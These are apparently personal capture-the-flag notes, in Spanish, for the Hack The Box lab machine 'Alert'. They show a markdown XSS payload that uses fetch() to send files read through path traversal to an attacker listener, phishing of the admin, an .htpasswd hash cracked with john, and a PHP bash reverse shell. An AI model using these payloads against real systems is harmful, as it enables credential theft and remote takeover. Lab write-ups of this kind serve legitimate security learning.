## Payload / CVE used
-  XSS(over markdown)
- Phishing 
---
Una vez localizado el xss probamos un exploit en el archivo de markdown 

```http
<script>  
fetch("http://alert.htb/messages.php?file=filepath")  
  .then(response => response.text())  
  .then(data => {  
    fetch("http://10.10.15.43:2323/?file_content=" + encodeURIComponent(data));  
  });  
</script>
```
El script hace lo siguiente:

- Obtiene el contenido de  la carpeta "messages" que devolvia un 403 Forbidden  (`http://alert.htb/messages.php?file=filepath`).
- Luego, toma ese contenido y lo reenvía como parámetro  a nuestro servidor en el puerto 2323 (`http://10.10.15.43:2323/`)

```bash
python3 -m http.server 2323   
Serving HTTP on 0.0.0.0 port 2323 (http://0.0.0.0:2323/) ...
```

Recibimos respuesta de nosotros mismos:
```bash
10.10.15.43 - - [29/Nov/2024 01:07:23] "GET /?file_content=%0A HTTP/1.1" 200 -
10.10.15.43 - - [29/Nov/2024 01:07:30] "GET /?file_content=%0A HTTP/1.1" 200 -
```
## Phishing
Podemos darle a boton de "share markdown" y nos devuelve un link que vamos a mandale al admin en "contact" 
(http://alert.htb/index.php?page=contact)
![[Pasted image 20241129010955.png]]
Nos devuelve conexion !

```bash
10.10.11.44 - - [29/Nov/2024 01:10:56] "GET /?file_content=%3Cpre%3E%3C%2Fpre%3E%0A HTTP/1.1" 200 -
```

Ahora sabemos que le podemos hacer un phishing al admin

Modificamos el script para sacar informacion
## .htpasswd

Vamos a buscar el .htpassword del subdominio statistics que vimos en el recon para sacar un hash

```http
<script>  
fetch("http://alert.htb/messages.php?file=./../../../../../../var/www/statistics.alert.htb/.htpasswd")  
  .then(response => response.text())  
  .then(data => {  
    fetch("http://10.10.15.43:2323/?file_content=" + encodeURIComponent(data));  
  });  
</script>

```

El archivo `.htpasswd` es utilizado en servidores web Apache para almacenar las credenciales de usuario y sus contraseñas, de modo que los usuarios puedan autenticarse cuando acceden a ciertas áreas del sitio protegido por autenticación básica. Este archivo se encuentra generalmente en el servidor (usualmente en un directorio fuera del acceso público) y contiene una lista de usuarios con sus contraseñas cifradas.
```bash

Serving HTTP on 0.0.0.0 port 2323 (http://0.0.0.0:2323/) ...
10.10.15.43 - - [29/Nov/2024 01:24:05] "GET /?file_content=%0A HTTP/1.1" 200 -
10.10.15.43 - - [29/Nov/2024 01:24:06] "GET /?file_content=%0A HTTP/1.1" 200 -
10.10.15.43 - - [29/Nov/2024 01:24:12] "GET /?file_content=%0A HTTP/1.1" 200 -
10.10.15.43 - - [29/Nov/2024 01:24:14] "GET /?file_content=%0A HTTP/1.1" 200 -
10.10.11.44 - - [29/Nov/2024 01:24:19] "GET /?file_content=%3Cpre%3E%3C%2Fpre%3E%0A HTTP/1.1" 200 -
```




```
10.10.15.43 - - [29/Nov/2024 01:21:21] "GET /?file_content=%0A HTTP/1.1" 200 -
10.10.15.43 - - [29/Nov/2024 01:21:24] "GET /?file_content=%0A HTTP/1.1" 200 -
10.10.11.44 - - [29/Nov/2024 01:21:30] "GET /?file_content=%3Cpre%3Ealbert%3A%24apr1%24bMoRBJOg%24igG8WBtQ1xYDTQdLjSWZQ%2F%0A%3C%2Fpre%3E%0A HTTP/1.1" 200 -

```

El texto codificado en URL `%3Cpre%3Ealbert%3A%24apr1%24bMoRBJOg%24igG8WBtQ1xYDTQdLjSWZQ%2F%0A%3C%2Fpre%3E%0A` 
puede ser decodificado de la siguiente manera:

    %3C corresponde a <
    %3E corresponde a >
    %24 corresponde a $
    %2F corresponde a /
    %0A corresponde a un salto de línea (nueva línea)

Al decodificarlo, obtenemos el siguiente texto:

```http
<pre>albert:$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/</pre>
```

Parece que tenemos un hash en md5 de apache

```java
$john -w=/usr/share/wordlists/rockyou.txt -format=md5crypt-long  hash
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt-long, crypt(3) $1$ (and variants) [MD5 32/64])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
manchesterunited (alber)     
1g 0:00:00:00 DONE (2024-11-29 01:30) 6.250g/s 17600p/s 17600c/s 17600C/s bebito..medicina
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

Ahora podemos conectarnos por ssh como usuario : Albert
## Lateral Movement


## Netsat
```bash
albert@alert:~$ netstat -tulnp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:68              0.0.0.0:*                           -        
```

Tenemos un jugoso 8080 donde vamos a mener el foucino 

```
ssh albert@alert.htb -L 8080:localhost:8080
```
![[Pasted image 20241129022709.png]]

https://github.com/neatnik/website-monitor

Dentro de la documentacion del github para monitor:

"Upload everything to your web server (except the `screen.png` file, which isn’t needed). Make sure that PHP has permission to write to the `monitors` directory (this is where monitor data is stored)."

vamos a buscar la carpeta monitors al sistema ya que php se comunica con la carpeta 

```
find / -type d -name "monitor" 2>/dev/null

### Respuesta
find / -type d -name "*monitor*" 2>/dev/null
/var/lib/systemd/deb-systemd-helper-enabled/mdmonitor.service.wants
/opt/website-monitor
/opt/website-monitor/monitors
/sys/kernel/slab/:A-0000192/cgroup/cred_jar(637:website-monitor.service)
/sys/kernel/slab/hugetlbfs_inode_cache/cgroup/hugetlbfs_inode_cache(637:website-monitor.service)
/sys/kernel/slab/:A-0001344/cgroup/UDPv6(637:website-monitor.service)
/sys/kernel/slab/sock_inode_cache/cgroup/sock_inode_cache(637:website-monitor.service)
/sys/kernel/slab/kmalloc-64/cgroup/kmalloc-64(637:website-monitor.service)
/sys/kernel/slab/radix_tree_node/cgroup/radix_tree_node(107:lvm2-monitor.service)
/sys/kernel/slab/radix_tree_node/cgroup/radix_tree_node(637:website-monitor.service)
/sys/kernel/slab/dentry/cgroup/dentry(637:website-monitor.service)
/sys/kernel/slab/dentry/cgroup/dentry(107:lvm2-monitor.service)
/sys/kernel/slab/:A-0000064/cgroup/anon_vma_chain(637:website-monitor.service)
/sys/kernel/slab/anon_vma/cgroup/anon_vma(637:website-monitor.service)
/sys/kernel/slab/:a-0000104/cgroup/buffer_head(107:lvm2-monitor.service)
/sys/kernel/slab/:a-0000104/cgroup/buffer_head(637:website-monitor.service)
/sys/kernel/slab/mm_struct/cgroup/mm_struct(637:website-monitor.service)
/sys/kernel/slab/inode_cache/cgroup/inode_cache(637:website-monito

....
```

La carpeta website-monitors parece promising vamos a echarle un vistazo
```
albert@alert:/opt/website-monitor$ ls -la .
total 96
drwxrwxr-x 7 root root        4096 Oct 12 01:07 .
drwxr-xr-x 4 root root        4096 Oct 12 00:58 ..
drwxrwxr-x 2 root management  4096 Oct 12 04:17 config
drwxrwxr-x 8 root root        4096 Oct 12 00:58 .git
drwxrwxr-x 2 root root        4096 Oct 12 00:58 incidents
-rwxrwxr-x 1 root root        5323 Oct 12 01:00 index.php
-rwxrwxr-x 1 root root        1068 Oct 12 00:58 LICENSE
-rwxrwxr-x 1 root root        1452 Oct 12 01:00 monitor.php
drwxrwxrwx 2 root root        4096 Oct 12 01:07 monitors
-rwxrwxr-x 1 root root         104 Oct 12 01:07 monitors.json
-rwxrwxr-x 1 root root       40849 Oct 12 00:58 Parsedown.php
-rwxrwxr-x 1 root root        1657 Oct 12 00:58 README.md
-rwxrwxr-x 1 root root        1918 Oct 12 00:58 style.css
drwxrwxr-x 2 root root        4096 Oct 12 00:58 updates

```

Con permiso de escritura en la carpeta config creamos un archivo `reverse.php`

```php
<?php exec("/bin/bash -c 'bash -i >/dev/tcp/10.10.15.43/4444 0>&1'"); ?>
```

ahora realizo una peticion web al archivo `localhost:8080/config/reverse.php`

![[Pasted image 20241129025934.png]]
### Local enumeration

- local 8080 open port 127.0.0.1:8080

### Atack vector

- 

---

